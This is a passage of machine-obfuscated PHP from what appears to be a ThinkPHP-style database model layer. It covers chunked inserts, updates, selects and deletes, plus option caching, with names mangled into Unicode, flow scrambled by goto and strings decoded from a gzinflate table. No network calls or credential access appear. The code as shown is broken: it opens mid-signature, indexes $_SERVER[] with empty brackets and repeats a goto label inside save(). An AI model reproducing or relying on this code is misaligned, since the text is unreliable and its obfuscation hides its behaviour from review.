$Dڋͯ = array(), $BԱ = false) { goto b; F: if (empty($f߫˖)) { $this->error = think_lang($e[269]); return !1; } $Dڋͯ = $this->_parseOptions($Dڋͯ); foreach ($f߫˖ as $A񊞖ތ => $F) { $f߫˖[$A񊞖ތ] = $this->_facade($F); $this->_beforeInsert($f߫˖[$A񊞖ތ], $Dڋͯ); } goto e͌; e͌: if (method_exists($this->db, $e[270])) { for ($d = 0; $d < count($f߫˖); $d += $Aő) { $D = array_slice($f߫˖, $d, $Aő); if (!is_array($D) || count($D) == 0) { break; } $Bӎ = $this->db->insertAll($D, $Dڋͯ, $BԱ); $this->chunkEventCheck(count($D)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($f߫˖ as $A񊞖ތ => $F) { $Bӎ = $this->db->insert($F, $Dڋͯ, $BԱ); } $this->commit(); } if (!1 !== $Bӎ) { $D = $this->getLastInsID(); if ($D) { return $D; } } return $Bӎ; goto F芯Ф; b: $e =& $_SERVER[]; ignore_timeout(); $Aő = self::SQL_WHERE_IN_CHUNK; goto F; F芯Ф: } public function save($eʩ = '', $c⯑Ծۛ = array()) { goto c; f: $B芑 = $Bꆿ[$a[273]][$c][1]; $B芑 = is_array($B芑) ? $B芑 : array(); $b¿я = count($B芑); goto FޕË; c: $a =& $_SERVER[]; $d˧Ѿ = self::SQL_WHERE_IN_CHUNK; $Bꆿ = $this->optionsValue(); goto F׉; F׉: $c = $this->findWhereField($Bꆿ); if (!$c) { return parent::save($eʩ, $c⯑Ծۛ); } $Eɖ = 0; goto f; FޕË: for ($Bۮջ = 0; $Bۮջ < $b¿я; $Bۮջ += $d˧Ѿ) { $Eț = array_slice($B芑, $Bۮջ, $d˧Ѿ); if (!is_array($Eț) || count($Eț) == 0) { break; } $Bꆿ[$a[273]][$c][1] = $Eț; $this->optionsValue($Bꆿ); $Eɖ += parent::save($eʩ, $c⯑Ծۛ); $this->chunkEventCheck(count($Eț)); } $this->chunkEventSet(); return $Eɖ; goto e൪; e൪: } public function add($Fۇ = '', $c = array(), $bƵҩޅ = false) { if ($this->addTaskStatus && is_array($Fۇ)) { $this->addTaskData[] = $Fۇ; return; } return parent::add($Fۇ, $c, $bƵҩޅ); } public function parseWhereLike($e, $DŞ = '', $F֑Ѕ = false, &$e̬█ = false) { goto añ; eк°: foreach ($e as $e哋 => $eᄊʧ) { if (is_array($eᄊʧ) && count($eᄊʧ) == 2 && $eᄊʧ[0] == $eȊ[380] && is_string($eᄊʧ[1]) && substr($eᄊʧ[1], 0, 1) == $eȊ[381] && substr($eᄊʧ[1], strlen($eᄊʧ[1]) - 1, 1) == $eȊ[381]) { goto e푴; e푴: $e̬█ = !0; $cȲ = is_string($e哋) ? $e哋 : $DŞ; $b񇏷提 = substr($eᄊʧ[1], 1, strlen($eᄊʧ[1]) - 2); goto cώ; cώ: $b񇏷提 = $this->db->escapeString($b񇏷提); if (!strpos($cȲ, $eȊ[95])) { $cȲ = $eȊ[382] . $cȲ . $eȊ[382]; } $Dτ = $eȊ[182] . $b񇏷提 . $eȊ[182]; goto E; Fޗ: continue; goto e; E: if ($c߹[$eȊ[383]]) { $Dτ = $eȊ[384] . $b񇏷提 . $eȊ[385]; if ($c߹[$eȊ[386]]) { $Dτ = $eȊ[385] . $b񇏷提 . $eȊ[384]; } } $B鷄礅[$eز] = $eȊ[387] . $cȲ . $eȊ[388] . $Dτ . $eȊ[389]; $eز++; goto Fޗ; e: } if (is_array($eᄊʧ)) { $DŞ = is_string($e哋) ? $e哋 : $DŞ; $eᄊʧ = $this->parseWhereLike($eᄊʧ, $DŞ, !0, $e̬█); } if (is_numeric($e哋)) { $B鷄礅[$eز] = $eᄊʧ; $eز++; } else { $B鷄礅[$e哋] = $eᄊʧ; } } if ($e̬█ && !$F֑Ѕ) { } return $B鷄礅; goto D; añ: $eȊ =& $_SERVER[]; $c߹ = $GLOBALS[$eȊ[6]][$eȊ[378]]; if (!$c߹[$eȊ[379]]) { return $e; } goto eǦ; eǦ: if (!is_array($e)) { return $e; } $B鷄礅 = array(); $eز = 0; goto eк°; D: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($B = array()) { goto fȻ; f䐎: return $B얠; goto CѤ; Bݦ: $fڼ = $this->findWhereField($Aۨ); if (!$fڼ || isset($Aۨ[$E崡֕[290]]) || isset($Aۨ[$E崡֕[351]])) { return parent::select($B); } $A = $Aۨ[$E崡֕[273]][$fڼ][1]; goto CÙ; fȻ: $E崡֕ =& $_SERVER[]; $eχƉ = self::SQL_WHERE_IN_CHUNK; $Aۨ = $this->optionsValue(); goto Bݦ; CÙ: $A = is_array($A) ? $A : array(); $B얠 = null; for ($dφ = 0; $dφ < count($A); $dφ += $eχƉ) { $Aꛞ = array_slice($A, $dφ, $eχƉ); if (!is_array($Aꛞ) || count($Aꛞ) == 0) { break; } $Aۨ[$E崡֕[273]][$fڼ][1] = $Aꛞ; $this->optionsValue($Aۨ); $B񒕤Ψ = parent::select($B); if (!$B񒕤Ψ) { continue; } $B얠 = is_array($B얠) ? $B얠 : array(); $B얠 = array_merge($B얠, $B񒕤Ψ); } goto f䐎; CѤ: } public function delete($c˅ = array()) { goto Aָ; b葷ר: $D㫌 = $this->findWhereField($cݩ); if (!$D㫌) { return parent::delete($c˅); } $dԟ = 0; goto bŨ; bŨ: $dɍ = $cݩ[$a[273]][$D㫌][1]; $dɍ = is_array($dɍ) ? $dɍ : array(); for ($cˣ˃ = 0; $cˣ˃ < count($dɍ); $cˣ˃ += $dӨ) { $eͶ = array_slice($dɍ, $cˣ˃, $dӨ); if (!is_array($eͶ) || count($eͶ) == 0) { break; } $cݩ[$a[273]][$D㫌][1] = $eͶ; $this->optionsValue($cݩ); $dԟ += parent::delete($c˅); } goto cˇ晉; Aָ: $a =& $_SERVER[]; $dӨ = self::SQL_WHERE_IN_CHUNK; $cݩ = $this->optionsValue(); goto b葷ר; cˇ晉: return $dԟ; goto D; D: } private function findWhereField($e¤˭) { $eڶ =& $_SERVER[]; $fڢ = self::SQL_WHERE_IN_CHUNK; if (!is_array($e¤˭) || !is_array($e¤˭[$eڶ[273]])) { return !1; } foreach ($e¤˭[$eڶ[273]] as $dƳ => $A褌) { if (is_array($A褌) && isset($A褌[0]) && is_string($A褌[0]) && strtolower($A褌[0]) == $eڶ[7] && is_array($A褌[1]) && count($A褌[1]) > $fڢ) { ignore_timeout(); return $dƳ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\x65\155\117\x70\164\x69\x6f\156"; public $field = array(); public function listData($E = false, $a = "\x6d\157\144\x69\146\171\x54\x69\x6d\x65", $Cܤ = false) { $b׽ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$b׽) { return $E ? null : array(); } if (!$E) { $b׽ = array_filter(array_values($b׽)); return array_sort_by($b׽, $a, $Cܤ); } return $b׽[$_SERVER[][390] . $E]; } public function insert($f̷) { goto e; e: $e =& $_SERVER[]; $f̷ = array_field_key($f̷, $this->field); $aމ = Model($this->modelType)->get($e[391], $this->optionType . $e[392]); goto B냬; B냬: $aމ = $aމ ? $aމ : 0; $f̷[$e[393]] = ++$aމ; $f̷[$e[194]] = time(); goto B؆͗; Câ: return $aމ; goto b؆; B؆͗: $f̷[$e[84]] = time(); Model($this->modelType)->set($e[391], $aމ, $this->optionType . $e[392]); Model($this->modelType)->set($e[390] . $aމ, $f̷, $this->optionType); goto Câ; b؆: } public function update($F, $fٞ㉲) { goto F; a: return Model($this->modelType)->set($D[390] . $F, $fٞ㉲, $this->optionType); goto C; Aś: if (!$e || !$F) { return !1; } $fٞ㉲ = array_merge($e, $fٞ㉲); $fٞ㉲[$D[84]] = time(); goto a; F: $D =& $_SERVER[]; $fٞ㉲ = array_field_key($fٞ㉲, $this->field); $e = $this->listData($F); goto Aś; C: } public function remove($F҆) { if (!$F҆) { return !1; } return Model($this->modelType)->remove($_SERVER[][390] . $F҆, $this->optionType); } public function clear() { $e =& $_SERVER[]; Model($this->modelType)->remove($e[391], $this->optionType . $e[392]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($d, $aޮ) { if (!$aޮ) { return !1; } $C = $this->listData(); $C = array_to_keyvalue($C, $d); return isset($C[$aޮ]) ? $C[$aޮ] : !1; } public function findByName($a䂦) { return $this->findByKey($_SERVER[][28], $a䂦); } protected function resetData($Bķ) { $A =& $_SERVER[]; $Bķ = is_array($Bķ) ? $Bķ : array(); $fＱŐ = array(); for ($e즼 = 0; $e즼 < count($Bķ); $e즼++) { $fＱŐ[$A[390] . $Bķ[$e즼][$A[393]]] = $Bķ[$e즼]; } return Model($this->modelType)->set($fＱŐ, !1, $this->optionType); } private function getAutoName($Cω) { $e = array_to_keyvalue($this->listData(), $_SERVER[][28]); if (!$e || !isset($e[$Cω])) { return $Cω; } for ($a쒅پ = 1; $a쒅پ < count($e); $a쒅پ++) { $C = $Cω . "\50{$a쒅پ}\x29"; if (!isset($e[$C])) { return $C; } } return $C; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($A = false, $f첔 = '', $e洯 = false) { goto E܇; E܇: $bݧɎ =& $_SERVER[]; $E = $this->cacheGet($f첔); $F񇼏 = $this->optionDefault($f첔); goto aә; dӖ: $this->cacheSet($f첔, $E); $E = array_merge($F񇼏, $E); return $A ? $E[$A] : $E; goto E°; bن: $E = $this->where($C)->select(); $E = array_to_keyvalue($E, $bݧɎ[93], $bݧɎ[372]); foreach ($E as $FǤ => $čԐϚ) { if ($e洯 || in_array($FǤ, $this->jsonField)) { $E[$FǤ] = json_decode($čԐϚ, !0); } } goto dӖ; aә: $F񇼏 = is_array($F񇼏) ? $F񇼏 : array(); if (is_array($E)) { $E = array_merge($F񇼏, $E); return $A ? isset($E[$A]) ? $E[$A] : null : $E; } $C = $this->filterWhere(array($bݧɎ[29] => $f첔)); goto bن; E°: } public function set($AȰٙ, $FÂǇ = false, $F֍ = '') { goto a; b: return $this->addAll($bۈƴ, array(), !0); goto F؃; a: $bӥ㋱ =& $_SERVER[]; $this->cacheRemove($F֍); $bۈƴ = array(); goto Fɂ; Fɂ: $cή = is_array($AȰٙ) ? $AȰٙ : array($AȰٙ => $FÂǇ); foreach ($cή as $bۺό => $E҉Ѹ) { if (is_array($E҉Ѹ)) { $E҉Ѹ = json_encode_force($E҉Ѹ); } $this->checkLength($E҉Ѹ, !1, $this->tableName . $bӥ㋱[4] . $AȰٙ); $E҉Ѹ = self::textEncode($E҉Ѹ); $cή = array($bӥ㋱[29] => $F֍, $bӥ㋱[93] => $bۺό, $bӥ㋱[372] => $E҉Ѹ); $bۈƴ[] = $this->filterWhere($cή); } if (!$bۈƴ) { return !0; } goto b; F؃: } protected function optionDefault($Bٌ = '') { return !1; } public function setDeep($Eۣ, $e酇 = false, $D = '') { $E㝤 = explode($_SERVER[][95], $Eۣ); $D = $this->get(); array_set_value($D, $Eۣ, $e酇); $this->set($E㝤[0], $D[$E㝤[0]], $D); } public function remove($EŨ, $EΪ = '') { $c =& $_SERVER[]; $this->cacheRemove($EΪ); $fڊ = $this->filterWhere(array($c[93] => $EŨ, $c[29] => $EΪ)); if (is_null($EŨ)) { unset($fڊ[$c[93]]); } return $this->where($fڊ)->delete(); } public function cacheSet($E, $dڱ = false) { return Cache::set($this->cacheKey($E), $dڱ); } public function cacheGet($dܔ) { return Cache::get($this->cacheKey($dܔ)); } public function cacheRemove($b) { return Cache::remove($this->cacheKey($b)); } protected function filterWhere($e犰) { return $e犰; } protected function cacheKey($d¨) { return $d¨; } } goto a; E: define($_SERVER[][0], $_SERVER[][1]); $_SERVER[] = explode($_SERVER[][2], gzinflate(substr($_SERVER[][3], 10, -8))); function binCheckEq($F籨, $F䈥) { return $F籨 == $F䈥; } goto BĦۢ; eیζ: define($_SERVER[][240], 0); define($_SERVER[][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\145", "\x6f\162\x64\x65\162", "\x61\154\151\x61\x73", "\150\141\166\151\x6e\147", "\x67\162\x6f\x75\160", "\x6c\157\x63\x6b", "\x64\151\163\x74\x69\156\x63\x74", "\x61\165\x74\x6f", "\x66\151\x6c\x74\145\162", "\166\141\154\151\144\x61\164\x65", "\162\145\x73\165\154\164", "\x62\151\156\144", "\x74\157\153\x65\156"); public function __construct($d͂ = '', $c鉃 = '', $f = '') { $e =& $_SERVER[]; $this->_initialize(); if (!empty($d͂)) { if (strpos($d͂, $e[95])) { list($this->dbName, $this->name) = explode($e[95], $d͂); } else { $this->name = $d͂; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($c鉃)) { $this->tablePrefix = $e[33]; } elseif ($e[33] != $c鉃) { $this->tablePrefix = $c鉃; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($e[242]); } $this->db(0, empty($this->connection) ? $f : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $cމ؇ =& $_SERVER[]; if (empty($this->fields)) { if (think_config($cމ؇[243])) { $Eן = $this->dbName ? $this->dbName : think_config($cމ؇[244]); $Aԩ = think_var_cache($cމ؇[245] . strtolower(get_path_this($Eן) . $cމ؇[95] . $this->name)); if ($Aԩ) { $F = think_config($cމ؇[246]); if (empty($F) || $Aԩ[$cމ؇[247]] == $F) { $this->fields = $Aԩ; return; } } } $this->flush(); } } public function flush() { goto bض; cȪ: if (think_config($eԤͳ[243])) { $B = $this->dbName ? $this->dbName : think_config($eԤͳ[244]); think_var_cache($eԤͳ[245] . strtolower(get_path_this($B) . $eԤͳ[95] . $this->name), $this->fields); } goto a; bض: $eԤͳ =& $_SERVER[]; $this->db->setModel($this->name); $cʟ = $this->db->getFields($this->getTableName()); goto e; e: if (!$cʟ) { return !1; } $this->fields = array_keys($cʟ); $this->fields[$eԤͳ[248]] = !1; goto a㏞; a㏞: foreach ($cʟ as $Bƹ => $A𐾿) { $d֏[$Bƹ] = $A𐾿[$eԤͳ[29]]; if ($A𐾿[$eԤͳ[36]]) { $this->fields[$eԤͳ[249]] = $Bƹ; if ($A𐾿[$eԤͳ[39]]) { $this->fields[$eԤͳ[248]] = !0; } } } $this->fields[$eԤͳ[250]] = $d֏; if (think_config($eԤͳ[246])) { $this->fields[$eԤͳ[247]] = think_config($eԤͳ[246]); } goto cȪ; a: } public function switchModel($AՇ, $Cׄ = array()) { $D̎ =& $_SERVER[]; $Cɩ = ucwords(strtolower($AՇ)) . $D̎[251]; if (!class_exists($Cɩ)) { think_exception($Cɩ . think_lang($D̎[252])); } $this->_extModel = new $Cɩ($this->name); if (!empty($Cׄ)) { foreach ($Cׄ as $aª) { $this->_extModel->setProperty($aª, $this->{$aª}); } } return $this->_extModel; } public function __set($cÆß, $c) { $this->data[$cÆß] = $c; } public function __get($D) { return isset($this->data[$D]) ? $this->data[$D] : null; } public function __isset($C) { return isset($this->data[$C]); } public function __unset($Bެ) { unset($this->data[$Bެ]); } public function __call($Cޑ׿, $F) { $DɄ =& $_SERVER[]; if (in_array(strtolower($Cޑ׿), $this->methods, !0)) { $this->options[strtolower($Cޑ׿)] = $F[0]; return $this; } elseif (in_array(strtolower($Cޑ׿), array($DɄ[253], $DɄ[254], $DɄ[255], $DɄ[256], $DɄ[257]), !0)) { $a = isset($F[0]) ? $F[0] : $DɄ[182]; $a = $this->db->parseKey($a); return $this->getField(strtoupper($Cޑ׿) . $DɄ[258] . $a . $DɄ[259] . $Cޑ׿, $DɄ[253]); } elseif (strtolower(substr($Cޑ׿, 0, 5)) == $DɄ[260]) { $a = think_parse_name(substr($Cޑ׿, 5)); $b𙾐[$a] = $F[0]; return $this->where($b𙾐)->find(); } elseif (strtolower(substr($Cޑ׿, 0, 10)) == $DɄ[261]) { $Aʦӟ = think_parse_name(substr($Cޑ׿, 10)); $b𙾐[$Aʦӟ] = $F[0]; return $this->where($b𙾐)->getField($F[1]); } elseif (isset($this->_scope[$Cޑ׿])) { return $this->scope($Cޑ׿, $F[0]); } elseif (method_exists($this, $Cޑ׿)) { array_unshift($F, $Cޑ׿); return call_user_func_array(array($this, $DɄ[262]), $F); } else { return call_user_func_array(array(parent, $Cޑ׿), $F); } } protected function call() { goto f; f: $f =& $_SERVER[]; $a = func_get_args(); $fϾԆ = array_shift($a); goto aȌ; aȌ: $CӄƑ = $fϾԆ; if (is_array($fϾԆ)) { $CӄƑ = $fϾԆ[1]; $fϾԆ = $fϾԆ[0]; } $EȨ̧ = count($a) - 1; goto A򘧂Ν; f: $aԡ = call_user_func_array(array($this, $fϾԆ), $a); if (method_exists($this, $f[266])) { $AރǕ = call_user_func_array(array($this, $f[267]), array($CӄƑ, $a, $aԡ)); if ($AރǕ) { return $AރǕ; } } return $aԡ; goto Bى; A򘧂Ν: if (isset($a[$EȨ̧]) && $a[$EȨ̧] === $fϾԆ) { think_exception(__CLASS__ . $f[4] . $fϾԆ . think_lang($f[263])); return; } $a[] = $fϾԆ; if (method_exists($this, $f[264])) { $AރǕ = call_user_func_array(array($this, $f[265]), array($CӄƑ, $a)); if (!is_null($AރǕ) && $AރǕ !== !1) { return $AރǕ; } } goto f; Bى: } protected function _initialize() { } protected function _facade($A֮ۆƟ) { $cĄ =& $_SERVER[]; if (!empty($this->fields)) { foreach ($A֮ۆƟ as $Dق҆ => $e餃ĺ) { if (is_array($this->fields) && !in_array($Dق҆, $this->fields, !0)) { unset($A֮ۆƟ[$Dق҆]); } elseif (is_scalar($e餃ĺ)) { $this->_parseType($A֮ۆƟ, $Dق҆); } } } if (!empty($this->options[$cĄ[268]])) { $A֮ۆƟ = array_map($this->options[$cĄ[268]], $A֮ۆƟ); unset($this->options[$cĄ[268]]); } $this->_beforeWrite($A֮ۆƟ); return $A֮ۆƟ; } protected function _beforeWrite(&$B翔) { } public function add($c = '', $Cŉ = array(), $b׈ = false) { goto eߪƨ; Aγۏ: return $Dʡ; goto c; DÉ: if (!1 === $this->_beforeInsert($c, $Cŉ)) { return !1; } $Dʡ = $this->db->insert($c, $Cŉ, $b׈); if (!1 !== $Dʡ) { $c = $this->getLastInsID(); if ($c) { $c[$this->getPk()] = $c; $this->_after_insert($c, $Cŉ); return $c; } $this->_after_insert($c, $Cŉ); } goto Aγۏ; eߪƨ: if (empty($c)) { if (!empty($this->data)) { $c = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[][269]); return !1; } } $Cŉ = $this->_parseOptions($Cŉ); $c = $this->_facade($c); goto DÉ; c: } protected function _beforeInsert(&$C, $c) { } protected function _after_insert($f, $B˞) { } public function addAll($Cڄ, $b靬 = array(), $eᕃ = false) { goto cﯸ; cﯸ: $bĐ =& $_SERVER[]; if (empty($Cڄ)) { $this->error = think_lang($bĐ[269]); return !1; } $b靬 = $this->_parseOptions($b靬); goto E; eގ: return $E஦; goto e; E: foreach ($Cڄ as $Eςé => $d) { $Cڄ[$Eςé] = $this->_facade($d); } if (method_exists($this->db, $bĐ[270])) { $E஦ = $this->db->insertAll($Cڄ, $b靬, $eᕃ); } else { $this->startTrans(); foreach ($Cڄ as $Eςé => $d) { $E஦ = $this->db->insert($d, $b靬, $eᕃ); } $this->commit(); } if (!1 !== $E஦) { $aú = $this->getLastInsID(); if ($aú) { return $aú; } } goto eގ; e: } public function selectAdd($e = '', $C = '', $fې = array()) { $C =& $_SERVER[]; $fې = $this->_parseOptions($fې); if (!1 === ($Bꂔ = $this->db->selectInsert($e ? $e : $fې[$C[271]], $C ? $C : $this->getTableName(), $fې))) { $this->error = think_lang($C[272]); return !1; } else { return $Bꂔ; } } public function save($B = '', $Cяӷ = array()) { goto eʈ˶; A: $Cяӷ = $this->_parseOptions($Cяӷ); $bͥ = $this->getPk(); if (!isset($Cяӷ[$f֠[273]])) { if (isset($B[$bͥ])) { $Bӳ[$bͥ] = $B[$bͥ]; $Cяӷ[$f֠[273]] = $Bӳ; unset($B[$bͥ]); } else { $this->error = think_lang($f֠[272]); return !1; } } goto A; Fԋ: if (!1 !== $A) { if (isset($Cԣ)) { $B[$bͥ] = $Cԣ; } $this->_afterUpdate($B, $Cяӷ); } return $A; goto DΘ; eʈ˶: $f֠ =& $_SERVER[]; if (empty($B)) { if (!empty($this->data)) { $B = $this->data; $this->data = array(); } else { $this->error = think_lang($f֠[269]); return !1; } } $B = $this->_facade($B); goto A; A: if (is_array($Cяӷ[$f֠[273]]) && isset($Cяӷ[$f֠[273]][$bͥ])) { $Cԣ = $Cяӷ[$f֠[273]][$bͥ]; } if (!1 === $this->_beforeUpdate($B, $Cяӷ)) { return !1; } $A = $this->db->update($B, $Cяӷ); goto Fԋ; DΘ: } protected function _beforeUpdate(&$aǸ, $E) { } protected function _afterUpdate($f, $Bċ׋) { } public function delete($e茩 = array()) { goto cܤ; dؗ: $A = $this->db->delete($e茩); if (!1 !== $A) { $F乴ȇ = array(); if (isset($C꟭)) { $F乴ȇ[$AҶη] = $C꟭; } $this->_after_delete($F乴ȇ, $e茩); } return $A; goto DǏ; cܤ: $A =& $_SERVER[]; if (empty($e茩) && empty($this->options[$A[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $AҶη = $this->getPk(); goto f; f: if (is_numeric($e茩) || is_string($e茩)) { if (strpos($e茩, $A[47])) { $Dڸ׈[$AҶη] = array($A[274], $e茩); } else { $Dڸ׈[$AҶη] = $e茩; } $this->options[$A[273]] = $Dڸ׈; } $e茩 = $this->_parseOptions(); if (is_array($e茩[$A[273]]) && isset($e茩[$A[273]][$AҶη])) { $C꟭ = $e茩[$A[273]][$AҶη]; } goto dؗ; DǏ: } protected function _after_delete($B٪, $Bۡ) { } public function select($e跔 = array()) { goto Fۜ; a: $bº = $this->db->select($e跔); if (!1 === $bº) { return !1; } if (empty($bº)) { return null; } goto bČ; bČ: $this->_afterSelect($bº, $e跔); return $bº; goto bڈه; Fۜ: $E陻 =& $_SERVER[]; if (is_string($e跔) || is_numeric($e跔)) { $CŨ = $this->getPk(); if (strpos($e跔, $E陻[47])) { $A[$CŨ] = array($E陻[274], $e跔); } else { $A[$CŨ] = $e跔; } $this->options[$E陻[273]] = $A; } elseif (!1 === $e跔) { $e跔 = $this->_parseOptions(); return $E陻[275] . $this->db->buildSelectSql($e跔) . $E陻[276]; } $e跔 = $this->_parseOptions(); goto a; bڈه: } protected function _afterSelect(&$D蘝̼, $Dŧ˘) { } public function buildSql($B = array()) { $E =& $_SERVER[]; $B = $this->_parseOptions($B); return $E[275] . $this->db->buildSelectSql($B) . $E[276]; } public function optionsValue($e܋ = null) { if (is_null($e܋)) { return $this->options; } elseif (is_array($e܋)) { $this->options = array_merge($this->options, $e܋); } } protected function _parseOptions($DՅ = array()) { goto D΢; Dү: if (isset($DՅ[$Aӏۏ[273]]) && is_array($DՅ[$Aӏۏ[273]]) && !empty($F) && !isset($DՅ[$Aӏۏ[280]]) && !isset($DՅ[$Aӏۏ[277]])) { foreach ($DՅ[$Aӏۏ[273]] as $aϨ => $c悟揠) { $aϨ = trim($aϨ); if (in_array($aϨ, $F, !0)) { if (is_scalar($c悟揠)) { $this->_parseType($DՅ[$Aӏۏ[273]], $aϨ); } } elseif (!is_numeric($aϨ) && $Aӏۏ[71] != substr($aϨ, 0, 1) && !1 === strpos($aϨ, $Aӏۏ[95]) && !1 === strpos($aϨ, $Aӏۏ[258]) && !1 === strpos($aϨ, $Aӏۏ[281]) && !1 === strpos($aϨ, $Aӏۏ[282])) { unset($DՅ[$Aӏۏ[273]][$aϨ]); } } } $this->_options_filter($DՅ); return $DՅ; goto dԣ; aѹҿݐ: if (!isset($DՅ[$Aӏۏ[277]])) { $DՅ[$Aӏۏ[277]] = $this->getTableName(); $F = $this->fields; } else { $F = $this->getDbFields(); } if (!empty($DՅ[$Aӏۏ[278]])) { $DՅ[$Aӏۏ[277]] .= $Aӏۏ[50] . $DՅ[$Aӏۏ[278]]; } $DՅ[$Aӏۏ[279]] = $this->name; goto Dү; D΢: $Aӏۏ =& $_SERVER[]; if (is_array($DՅ)) { $DՅ = array_merge($this->options, $DՅ); } $this->options = array(); goto aѹҿݐ; dԣ: } protected function _options_filter(&$CƵ) { } protected function _parseType(&$c㑕, $b) { $F֑ =& $_SERVER[]; if (empty($this->options[$F֑[283]][$F֑[4] . $b])) { $E񪌊 = strtolower($this->fields[$F֑[250]][$b]); if (!1 !== strpos($E񪌊, $F֑[284])) { } elseif (!1 === strpos($E񪌊, $F֑[285]) && !1 !== strpos($E񪌊, $F֑[286])) { $c㑕[$b] = intval($c㑕[$b]); } elseif (!1 !== strpos($E񪌊, $F֑[287]) || !1 !== strpos($E񪌊, $F֑[288])) { $c㑕[$b] = floatval($c㑕[$b]); } elseif (!1 !== strpos($E񪌊, $F֑[289])) { $c㑕[$b] = (bool) $c㑕[$b]; } } } public function find($EՒͷ = array()) { goto C; C: $F =& $_SERVER[]; if (is_numeric($EՒͷ) || is_string($EՒͷ)) { $aӌ[$this->getPk()] = intval($EՒͷ); $this->options[$F[273]] = $aӌ; } $this->options[$F[290]] = 1; goto b; CР: if (!empty($this->options[$F[291]])) { return $this->returnResult($this->data, $this->options[$F[291]]); } return $this->data; goto Eﱗ; b: $EՒͷ = $this->_parseOptions(); $F㍂ = $this->db->select($EՒͷ); if (!1 === $F㍂) { return !1; } goto Aš; Aš: if (empty($F㍂)) { return null; } $this->data = $F㍂[0]; $this->_afterFind($this->data, $EՒͷ); goto CР; Eﱗ: } protected function _afterFind(&$f휥, $D) { } protected function returnResult($Aݫ, $C = '') { $FΙ =& $_SERVER[]; if ($C) { if (is_callable($C)) { return call_user_func($C, $Aݫ); } switch (strtolower($C)) { case $FΙ[292]: return json_encode($Aݫ); case $FΙ[293]: return xml_encode($Aݫ); } } return $Aݫ; } public function parseFieldsMap($CΓ, $DԵ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $a㿽 => $C̎) { if ($DԵ == 1) { if (isset($CΓ[$C̎])) { $CΓ[$a㿽] = $CΓ[$C̎]; unset($CΓ[$C̎]); } } else { if (isset($CΓ[$a㿽])) { $CΓ[$C̎] = $CΓ[$a㿽]; unset($CΓ[$a㿽]); } } } } return $CΓ; } public function setField($aւ, $FІ荐 = '') { if (is_array($aւ)) { $d괋Ŋ = $aւ; } else { $d괋Ŋ[$aւ] = $FІ荐; } return $this->save($d괋Ŋ); } public function setAdd($f, $F = 1) { $a· =& $_SERVER[]; $d = $f . $a·[294] . $F; if ($F < 0) { $d = $f . $F; } return $this->setField($f, array($a·[295], $d)); } public function getField($Cۊ, $Fݶ = null) { $cէ =& $_SERVER[]; $Eꈮ[$cէ[271]] = $Cۊ; $Eꈮ = $this->_parseOptions($Eꈮ); $Cۊ = trim($Cۊ); if (strpos($Cۊ, $cէ[47])) { if (!isset($Eꈮ[$cէ[290]])) { $Eꈮ[$cէ[290]] = is_numeric($Fݶ) ? $Fݶ : $cէ[33]; } $Bܿ = $this->db->select($Eꈮ); if (!empty($Bܿ)) { goto d󔭰; Fͩ: foreach ($Bܿ as $a픈) { $bڿզ = $a픈[$Eǧ]; if (2 == $b) { $aﴱ[$bڿզ] = $a픈[$Cݑ]; } else { $aﴱ[$bڿզ] = is_string($Fݶ) ? implode($Fݶ, $a픈) : $a픈; } } return $aﴱ; goto a牡; b: $Cݑ = array_shift($Cۊ); $aﴱ = array(); $b = count($D؉܂); goto Fͩ; d󔭰: $D؉܂ = explode($cէ[47], $Cۊ); $Cۊ = array_keys($Bܿ[0]); $Eǧ = array_shift($Cۊ); goto b; a牡: } } else { if (!0 !== $Fݶ) { $Eꈮ[$cէ[290]] = is_numeric($Fݶ) ? $Fݶ : 1; } if ($Fݶ === $cէ[253]) { unset($Eꈮ[$cէ[290]]); } $a픈 = $this->db->select($Eꈮ); if (!empty($a픈)) { if ($Fݶ === $cէ[253]) { return reset($a픈[0]); } if (!0 !== $Fݶ && 1 == $Eꈮ[$cէ[290]]) { return reset($a픈[0]); } foreach ($a픈 as $D߳) { $Cݓ[] = $D߳[$Cۊ]; } return $Cݓ; } } return null; } public function create($C = '', $cҎἚ = '') { goto f܇ڹ; Cѣ: if ($this->autoCheckFields) { $dɗ = $this->getDbFields(); foreach ($C as $Bܑ֜ => $FǏ) { if (!in_array($Bܑ֜, $dɗ)) { unset($C[$Bܑ֜]); } elseif (MAGIC_QUOTES_GPC && is_string($FǏ)) { $C[$Bܑ֜] = stripslashes($FǏ); } } } $this->autoOperation($C, $cҎἚ); $this->data = $C; goto Eָ; D錦ږ: if (isset($dɗ)) { if (is_string($dɗ)) { $dɗ = explode($a[47], $dɗ); } if (think_config($a[296])) { $dɗ[] = think_config($a[297]); } foreach ($C as $Bܑ֜ => $FǏ) { if (!in_array($Bܑ֜, $dɗ)) { unset($C[$Bܑ֜]); } } } if (!$this->autoValidation($C, $cҎἚ)) { return !1; } if (!$this->autoCheckToken($C)) { $this->error = think_lang($a[298]); return !1; } goto Cѣ; Eָ: return $C; goto dč; Aʱɬ: $C = $this->parseFieldsMap($C, 0); $cҎἚ = $cҎἚ ? $cҎἚ : (!empty($C[$this->getPk()]) ? THINK_MODEL_UPDATE : 